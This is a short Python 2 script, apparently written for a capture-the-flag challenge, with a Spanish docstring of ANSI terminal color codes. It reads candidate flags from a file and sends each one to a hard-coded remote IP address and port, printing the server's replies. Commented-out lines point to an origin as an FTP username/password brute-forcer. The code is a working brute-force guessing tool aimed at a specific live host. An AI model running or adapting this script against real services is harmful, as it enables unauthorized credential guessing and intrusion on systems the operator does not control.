#!/usr/bin/python

import socket
import sys

"""
Formato Colores: \033[cod_formato;cod_color_texto;cod_color_fondom


Estilos    Cod. ANSI
Sin efecto      0
Negrita         1
Debil           2
Cursiva         3
Subrayado       4
Inverso         5
Oculto          6
Tachado         7


Colores  Texto   Fondo
Negro      30     40
Rojo       31     41
Verde      32     42
Amarillo   33     43
Azul       34     44
Morado     35     45
Cian       36     46
Blanco     37     47

Examples
print("\033[2J\033[1;1f") # Borrar pantalla y situar cursor
print("\033[1;33m"+"Texto en negrita color amarillo"+'\033[0;m') 
print("\033[;36m"+"Texto normal de color cian")
print("\033[4;35;47m"+"Texto subr morado sobre blanco"+'\033[0;m') 
print("\033[4;35m"+"Texto normal subr color morado"+'\033[0;m')

"""
def main():
    usuarios = open('flag.txt', 'r')
    print "\033[1;31m" + "Attack Force Brute CTF..."
    for user in usuarios:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        try:
            s.connect(('165.227.110.243',12482))
            #print "Conectado!!"
            r = s.recv(1024)
            #print r
            s.sendall("enter the flag: "+str(user.strip('\n'))+"\r\n")
            r = s.recv(1024)
            print r
               
            #if r.find("230") != -1:
            #    print "\033[1;37m"
            #    print "Usuario/Password Found!!"
                #print response + "\n"
            #    s.settimeout(1)
            s.close()
        except:
            print "Error al realizar la conexion!!!"
            pass
            
if __name__ == '__main__':
    main()

